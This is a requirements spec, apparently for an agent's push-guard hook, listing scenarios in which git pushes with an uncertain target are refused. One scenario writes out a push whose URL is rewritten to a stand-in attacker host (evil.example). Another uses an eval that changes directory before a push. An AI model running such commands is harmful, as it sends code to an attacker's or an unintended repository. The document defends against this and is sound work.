## MODIFIED Requirements

### Requirement: Push shapes the push guard refuses
`guard-push-remote` SHALL block a push whose target it read as uncertain. In a command the loop parser reads: a looped push with no remote, or a bare push in a push chain that may switch branch or tracking. In any command: a URL with no `owner/repo`, a repository moved by `trap`, `GIT_DIR`, `--git-dir` or `--work-tree`, or by an `eval` as "Push after an eval of text built at run time" says, a push URL the command rewrites, or a remote git cannot resolve.

#### Scenario: Loop with no remote
- **WHEN** the command is `for b in a b; do git push; done`
- **THEN** the hook exits 2 with `git push in loop without explicit remote`

#### Scenario: Bare push in a chain that switches branch
- **WHEN** the command is `git push origin feat && git checkout main && git push`
- **THEN** the hook exits 2 with `chained git push without explicit remotes`

#### Scenario: Rewritten push URL
- **WHEN** the command is `git -c url.https://evil.example/.insteadOf=https://github.com/ push origin main`
- **THEN** the hook exits 2 with `Cannot tell where this push goes`

#### Scenario: No push remote
- **WHEN** a bare `git push` runs in a repository with no `origin` and no configured push remote for the branch
- **THEN** the hook exits 2 with `Cannot resolve push target`

## ADDED Requirements

### Requirement: Push after an eval of text built at run time
`guard-push-remote` SHALL judge a push after an `eval` whose script is built at run time (`eval "$S"`, `eval "$(direnv export bash)"`) in the directory it read. It MUST still refuse when something it read may move: the `eval`'s words name `cd`, `pushd`, `popd` or `eval`, or hold a backslash, a variable the command names, or an expansion other than `$NAME`, `${NAME}` and `$(…)`; or the command defines a function, may replace a tool, or names a `GIT_` variable. A literal `eval` still refuses.

#### Scenario: direnv line in an owned checkout
- **WHEN** the command is `eval "$(direnv export bash)"; git push origin feat` in a checkout whose `origin` is owned
- **THEN** the hook exits 0

#### Scenario: direnv line in an unowned checkout
- **WHEN** the command is `eval "$(direnv export bash)"; git push origin feat` in a checkout whose `origin` is not owned
- **THEN** the hook exits 2 with `Push target is not yours`

#### Scenario: A variable the command names
- **WHEN** the command is `S='cd /other'; eval "$S"; git push origin feat` in an owned checkout
- **THEN** the hook exits 2 with `Cannot tell which repository this push runs in`

#### Scenario: A literal eval
- **WHEN** the command is `eval 'echo hi'; git push origin feat` in an owned checkout
- **THEN** the hook exits 2 with `Cannot tell which repository this push runs in`
